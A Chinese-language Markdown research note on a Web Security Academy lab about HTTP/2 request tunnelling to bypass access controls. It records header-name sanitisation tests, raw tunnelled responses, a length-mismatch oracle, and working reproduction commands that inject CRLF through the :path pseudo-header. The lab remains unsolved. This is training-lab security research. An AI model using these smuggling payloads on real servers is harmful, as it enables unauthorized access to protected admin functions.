---
title: lab-request-smuggling-h2-bypass-access-controls-via-request-tunnelling
---

# lab-request-smuggling-h2-bypass-access-controls-via-request-tunnelling

> evidences: [[h2-smuggling-family]]

- 题面:以 administrator 访问 `/admin` 并删 carlos;前端 h2→h1 降级、且"**fails to adequately sanitize incoming header names**";前端不复用后端连接(只剩 tunnelling)。
- 实例(批47):https://0a7500110475e31f801344e700ad0087.web-security-academy.net
- 判定:**stuck**(注入面与读通道全部量化;门仍堵在"内层请求拿不到前端信任位")

## 新证据:前端头名消毒矩阵(全部可复现)

| 注入位置 | 结果 |
| --- | --- |
| 头 **值** 里含 `\r\n`(完整内层请求) | `RST_STREAM`(值被拦) |
| 头 **名** 里含 `\r\n` | `400 {"error":"Invalid request"}` |
| 头 **名** 里含裸 `\n` | `400 {"error":"Newlines in headers are not allowed"}` |
| 头 **名** 里含**空格**(`x-ssl-verified ` = 冒号前空格) | **放行**(401,请求正常到达)→ 名字未被完整归一化,但单靠名字变形过不了门 |
| 头 **名** 里含 **制表符** | 放行(401) |
| **`:path` 里含 CRLF** | **放行且被前端原样写进 h1** ⇒ 唯一可用的注入面 |

## 读通道(byte-exact 复现)

- 外层 `HEAD /admin` + `:path` 注入内层 `GET /admin`(内层头块**留空不收尾**),h2 body 直接给出**内层响应的原始字节**:

  ```
  HTTP/1.1 401 Unauthorized\r\nContent-Type: text/html; charset=utf-8\r\nSet-Cookie: session=…\r\n
  X-Frame-Options: SAMEORIGIN\r\nKeep-Alive: timeout=0\r\nContent-Length: 2776\r\n\r\n<!DOCTYPE html>…
  ```
  ⇒ 内层 `/admin` 仍是 **401**(2776B),即前端**没有**把 `X-SSL-VERIFIED`/`X-SSL-CLIENT-CN`/`X-FRONTEND-KEY` 追加进这次内层请求的头块(或被后端忽略)。
- 若内层头块**自己收尾**(注入以 `\r\n` 结束),前端立刻报 **`500 Server Error: Received only 174 of expected 2776 bytes of data`** ⇒ 直接读出前端的**期望长度记账**(外层 `/admin` 期望 2776B),这是比批44 更锐利的判据(success/fail 二值化)。
- 基线:`/admin` = 401 2776B,文案 `Admin interface only available if logged in as an administrator`。

## 未决面

- 门 = **会话角色**(401 文案),而前端信任位(X-SSL-*)在 tunnelling 路径上不可继承;名字变形(空格/制表/换行)全试过,均不能翻 401。下一手候选:①先把 `/admin` 的**期望长度记账**当 oracle 扫"哪一种内层头块切法能让内层响应的长度/状态改变"(逐字节二分);②找前端**追加头**的真正触发条件(是否只对带客户端证书的 TLS 连接追加),据此判断本 lab 是否要求先获取管理员会话。

## 新证据(批49:期望长度记账取到锐利数值)

`:path` 隧道注入一条**自带 `Content-Length`** 的内层 `POST /`(body 起点写 `search=`,试图把前端追加的头块读成 body):

```
h2_req <inst>/ --method HEAD --path '/ HTTP/1.1\r\nHost: <inst>\r\n\r\nPOST / HTTP/1.1\r\nHost: <inst>\r\nContent-Length: 140\r\n\r\nsearch='
→ 500 Server Error: Received only 3923 of expected 8811 bytes of data
```

⇒ 本实例 `/` 的前端期望长度 = **8811**(批47 的 `/admin` 2776 是同一 oracle 的另一刻度),后端只给出 3923 ⇒ 装配余量 = 4888 字节,可直接算。内层响应体里**没有**回显到 `X-SSL-*` / `X-FRONTEND-KEY`(追加头块没落进可见 body)⇒ key 仍未泄漏,门仍是会话角色 ⇒ 判定仍 **stuck**。

## 复现命令

```
h2_req "https://<inst>/" --method HEAD --path '/admin HTTP/1.1\r\nHost: <inst>\r\nx-foo: bar\r\n\r\nGET /admin HTTP/1.1\r\nHost: <inst>' --read-ms 3000
```

## 关系

- 族:[[h2-smuggling-family]];方法与"特权判据分叉/凭据组合枚举"见 [[h2-tunnelling-and-h2cl-practice]]。
